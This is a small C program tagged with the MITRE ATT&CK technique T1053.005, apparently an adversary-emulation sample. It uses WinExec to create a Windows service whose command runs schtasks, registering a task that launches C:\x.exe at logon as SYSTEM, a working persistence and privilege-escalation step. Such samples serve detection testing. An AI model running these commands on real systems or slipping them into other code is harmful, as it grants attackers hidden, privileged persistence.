// Link      = https://attack.mitre.org/techniques/T1053/005/
// Technique = Scheduled Task/Job: Scheduled Task
// ID        = T1053.005
// Tactics   = Execution, Persistence, Privilege Escalation,

#include <windows.h>

#define RUN(toRun) WinExec("sc create MyService binPath= cmd.exe /c " toRun, SW_SHOW);

int main() {
    RUN("schtasks /create /tn \"abc\" /tr C:\\x.exe /sc ONLOGON /ru \"System\"");
    return 0;
}